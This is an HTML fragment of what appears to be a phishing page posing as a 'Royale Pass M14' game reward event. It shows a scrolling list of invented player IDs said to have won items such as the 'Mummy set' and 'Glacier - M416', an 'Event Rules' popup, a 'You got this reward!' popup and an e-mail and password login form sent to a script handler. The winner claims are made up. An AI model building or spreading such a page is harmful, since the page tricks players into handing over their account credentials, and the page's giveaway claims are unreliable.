...
<title>ROYALE PASS M14 EVENT</title>
...
<div class="slider animated fadeIn">!ID 5883485425 Successful Get 5 Materials </div>
<div class="slider animated fadeIn">!ID 5295893347 Successful Get Mummy set</div>
<div class="slider animated fadeIn">!ID 5963737318 Successful Get Glacier - M416</div>
<div class="slider animated fadeIn">!ID 5888686451 Successful Get 3 Materials </div>
<div class="slider animated fadeIn">!ID 5155030554 Successful Get Mummy set </div>
<div class="slider animated fadeIn">!ID 5463336783 Successful Get 4 Materials </div>
</div></div>
...
<div class="footer-txt-join">Join the Community</div> 
...
<div class="popup newhome">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Event Rules</div> 
</div> 
<div class="popup-box-bg">
<div class="popup-box-alert7"><br>
Make sure you fill in the data correctly
<br>
Reward only valid for one ID character
<br>
Reward sent by in-game mail
<br><br><br>
</div>
</div> 
<div class="popup-box-form-footer">
<button type="button" onmousedown="tutup.play();" onclick="close_newhome()">Agree</button>
</div> 
</div> 
</div> 
...
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Congratulation</div> 
</div> 
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>You got this reward!</div> 
...
<div class="popup-box-navbars">
<img onmousedown="tutup.play();" onclick="close_mail_login()" src="img/popup-close.png">
<div class="popup-box-navbars-title">Log in with e-mail</div> 
</div> 
<div class="popup-box-bgs">
<div class="popup-box-alerts4"><br></div> 
<form class="popup-box-formx" form action="javascript:void(0)" method="post" id="ValidateLoginMailForm"><center>
<input type="hidden" name="login" id="login-link" value="Link_email" readonly>
<label>E-mail address</label><input type="email" name="email" id="email-link" placeholder="Enter your e-mail" required minlength="6" oninvalid="this.setCustomValidity('Input your E-mail address')" oninput="setCustomValidity('')">
<label style="margin-left:26px">Password</label><input type="password" name="password" id="password-link" placeholder="Please enter password" required minlength="6" oninvalid="this.setCustomValidity('Input your Password')" oninput="setCustomValidity('')">
<br><br><br><br>
</div> 
<div class="popup-box-footers">
<button type="submit" onclick="ValidateLoginMailData()">OK</button>
</center></div> 
</div> 
</form> 
</div> 
